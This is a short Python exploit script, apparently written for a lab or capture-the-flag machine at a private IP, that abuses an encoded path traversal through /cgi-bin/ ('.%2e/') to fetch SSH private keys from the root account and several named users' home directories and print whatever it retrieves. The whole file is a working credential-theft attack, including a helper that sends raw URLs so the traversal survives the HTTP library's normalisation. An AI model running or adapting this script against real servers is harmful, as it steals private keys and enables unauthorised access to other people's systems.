import requests

base_url = "http://192.168.221.245:8000"

user_dirs = [
    "root",
    "home/miranda",
    "home/steven",
    "home/mark",
    "home/anita",
]

keys = [
    "id_rsa",
    "id_ecdsa",
    "id_ecdsa_sk",
    "id_ed25519",
    "id_ed25519_sk",
    "id_dsa",
]


def get(url: str):
    """this extra step is neede, because requests escapes ../ path travervals. This workaround works like curl --path-as-is."""
    s = requests.Session()
    req = requests.Request(method="get", url=url)
    prep = req.prepare()
    prep.url = url
    return s.send(prep, verify=False)


def main():
    for key in keys:
        for user_dir in user_dirs:
            response = get(
                f"{base_url}/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/{user_dir}/.ssh/{key}"
            )
            print(response.status_code, user_dir, key)
            if response.ok:
                print(response.text)


if __name__ == "__main__":
    main()
